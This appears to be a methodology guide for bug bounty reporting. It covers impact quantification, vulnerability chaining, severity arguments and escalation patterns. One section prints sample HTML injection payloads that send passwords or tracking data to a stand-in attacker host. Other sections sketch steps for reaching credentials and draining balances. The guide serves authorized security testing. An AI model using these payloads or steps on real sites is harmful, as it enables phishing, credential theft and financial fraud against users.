---
name: proof-of-impact
category: methodology
description: Demonstrating real business impact from technical findings through quantification, chaining, and impact-first writing
depends_on: []
---

# Proof of Impact

A bug without demonstrated impact is an informational. The same bug with quantified business consequences is a Critical. Impact determines severity, payout, and whether the finding gets fixed.

## When to Use

- Writing any bug bounty report above Informational severity
- A technically valid finding that feels underwhelming on its own
- Triagers consistently downgrade your severity assessments
- You need to justify Critical or High severity to a non-technical audience

## Methodology

### Step 1: Identify the Terminal Harm

Before writing anything, answer: "What is the worst realistic thing that happens to a real user or the business?"

Not the mechanism. Not the technical flaw. The consequence.

| Technical Finding | Mechanism | Terminal Harm |
|-------------------|-----------|---------------|
| IDOR on `/api/users/{id}` | Iterate IDs | Full PII dump of all users (names, emails, addresses) |
| SSRF via image proxy | Fetch internal URLs | AWS credentials leaked, full cloud compromise |
| Race condition on transfer | Double-spend | Financial loss: attacker drains $X per exploitation |
| Stored XSS in comments | Script execution | Session hijack of any user who views the page |

### Step 2: Quantify the Exposure

Put numbers on the impact wherever possible:

- **User count**: "Affects all 2M registered users" vs "affects users who enabled feature X"
- **Data volume**: "Exposes 500K records containing PII" vs "exposes email addresses"
- **Financial value**: "Each exploitation nets $500 in stolen credits" vs "credits can be duplicated"
- **Blast radius**: "Compromises admin account with access to all customer data" vs "elevated privileges"
- **Automation potential**: "Scriptable at 1000 requests/minute" vs "manual exploitation"

### Step 3: Chain for Maximum Severity

Single findings often cap at Medium. Chains reach Critical:

1. Start with your finding's postcondition (what state it creates)
2. Search for other findings or known attack patterns that use that state as a precondition
3. Build the sequence: Finding A enables Finding B enables terminal impact

Example: Info disclosure (Low) + IDOR (Medium) = Account Takeover (Critical)

### Step 4: Impact-First Writing

Structure reports so impact hits first:

```
Title: [Impact], not [Mechanism]
  BAD:  "IDOR on /api/v2/users endpoint"
  GOOD: "Full account takeover via predictable user ID enumeration"

Summary: [Who is affected] + [What they lose] + [How easily]
  BAD:  "The endpoint does not validate authorization"
  GOOD: "Any authenticated user can access the complete PII 
         (name, email, phone, address) of all 2M platform users
         by incrementing the user ID parameter"
```

### Step 5: Business Language Translation

| Technical Term | Business Translation |
|----------------|---------------------|
| SQL injection | Unauthorized database access, potential full data breach |
| XSS | Attacker can impersonate any user, steal sessions |
| SSRF | Internal infrastructure exposed, cloud credentials at risk |
| Race condition | Financial controls bypassed, direct monetary loss |
| IDOR | Unauthorized access to other users' private data |
| Auth bypass | Complete access without credentials, equivalent to stolen password |
| RCE | Full server compromise, attacker controls the system |

### Step 6: Evidence That Proves Harm

The PoC must demonstrate the harm, not just the mechanism:

| Insufficient Evidence | Sufficient Evidence |
|----------------------|---------------------|
| "Request returns 200" | "Response contains victim's SSN, address, and payment info" |
| "Parameter is reflected" | "Alert fires in victim's browser session after visiting the page" |
| "Function can be called" | "Attacker's balance increased by $500 while victim's decreased by $500" |
| "Internal IP is returned" | "AWS metadata endpoint returns IAM role credentials with S3 full access" |

## Severity Justification Framework

For each severity claim, provide:

1. **Who**: which users/roles are affected (all users, admins, specific segment)
2. **What**: what they lose (data, money, access, privacy)
3. **How easy**: attacker skill and access needed (unauthenticated, any user, specific conditions)
4. **How scalable**: one victim vs all users, manual vs automated
5. **What data**: specific fields exposed or actions possible

## Common Downgrade Reasons and Counters

| Downgrade Reason | Counter Strategy |
|------------------|-----------------|
| "Low impact" | Quantify: user count, data fields, financial value |
| "Requires authentication" | Demonstrate free account signup, or chain with auth bypass |
| "Unlikely scenario" | Show the exact steps, prove it works in production |
| "Not exploitable" | Provide working PoC with real impact assertion |
| "By design" | Show the security consequence the design did not intend |

---

## Corpus-Derived Impact Escalation Patterns

Techniques from high-bounty reports that demonstrate how researchers converted low-severity findings into high-severity payouts through impact proof.

### Escalate Dismissed Findings with Deeper Enumeration

When an initial finding is dismissed or classified as low severity:

1. Use the dismissed finding as a foothold. The access it provides often reveals higher-severity bugs that require that foothold.
2. Path traversal reading `/etc/passwd` is Low. Path traversal reading the application's config file with database credentials is Critical. Same bug, different target file.
3. Info disclosure of an internal API endpoint is Low. SSRF to that endpoint returning cloud credentials is Critical. Same access, deeper exploitation.
4. Re-submit with the escalated impact chain. Reference the original report to show progression.

### Progressive Exploitation Chain Building

Real-world attacks often require chaining multiple lower-severity vulnerabilities:

1. Document each step's output and the next step's input requirement.
2. Show that no single step is sufficient but the combination achieves Critical impact.
3. The chain severity is determined by the terminal impact, not the weakest link.

| Chain Pattern | Individual Severities | Chain Severity |
|---------------|----------------------|----------------|
| Open redirect -> OAuth token theft -> ATO | Low + Medium | Critical |
| Info leak -> SSRF -> Cloud creds | Low + Medium | Critical |
| Self-XSS + cookie tossing + CSRF bypass | None + Low + Medium | High |
| Race condition -> balance manipulation -> cash out | Medium + Medium | Critical |

### Side-Channel Impact for Authorization Bugs

For every API endpoint with authorization checks, enumerate the side effects:

1. Does the endpoint trigger outbound requests (webhooks, notifications, emails) even when the response is 403?
2. Does the endpoint modify server-side state (audit logs, counters, rate limit buckets) even on denied requests?
3. Does the response timing differ based on the existence or state of the resource?
4. Side effects that fire before authorization checks are findings — show the side effect, not just the 403.

### Financial Invariant Testing

For any payment, money, or financial flow API:

1. Identify ALL monetary fields in the request and response.
2. Assert the invariant: `sum(debits) == sum(credits)` across the full transaction.
3. Test: can you modify the amount field between initiation and confirmation? Can you replay the confirmation with different amounts?
4. Race the financial operation: send concurrent transfer requests and check if the total debited exceeds the total credited (or vice versa).
5. Show the concrete dollar amount lost or gained per exploitation.

### CSRF Impact Maximization

Not all CSRF findings are equal. Maximize impact by targeting the highest-consequence action:

1. CSRF on profile edit is Medium. CSRF on 2FA enrollment (attacker enrolls their own device) is Critical.
2. CSRF on settings change is Medium. CSRF on account deletion is High.
3. Test every destructive and security-sensitive action, not just the first state-changing endpoint you find.
4. For CSRF on payment/transfer operations, show the concrete financial impact per exploitation.

### HTML Injection Without Script (Impact Proof)

When `<script>` is blocked but HTML tags are allowed:

1. `<a href="https://attacker.com/phish">Click here to verify your account</a>` — phishing via injected link.
2. `<form action="https://attacker.com/steal"><input name="password" type="password">` — credential harvesting via injected form.
3. `<img src="https://attacker.com/track?user=VICTIM">` — tracking/deanonymization.
4. HTML injection without scripts is still impactful — show the specific user-facing consequence.

### GraphQL Field-Level Authorization Audit

1. Discover the GraphQL endpoint and pull the full schema.
2. Build a matrix: every field x every role. Query each field with each role's credentials.
3. Fields that return data to unauthorized roles are findings. Severity depends on the data: user IDs are Low, financial data is High, authentication tokens are Critical.
4. Test union types and inline fragments — they sometimes return fields the base type query denies.

### Context-Aware Severity for Common Bug Classes

Before reporting, assess the specific context to justify severity:

1. **Clickjacking**: Only report if the frameable page contains state-changing actions (not just read-only content). Show the specific action that can be forced.
2. **Subdomain takeover**: Severity depends on what the subdomain's trust level enables — cookie scope, CORS policy, CSP allowlist, email sending domain.
3. **Open redirect**: Low alone, but chain with OAuth/SSO to escalate. Always attempt the chain before reporting the redirect standalone.
4. **Info disclosure**: Severity depends on what is disclosed. Internal paths are Low; credentials are Critical; user PII is High. Same bug class, severity varies 4 tiers.
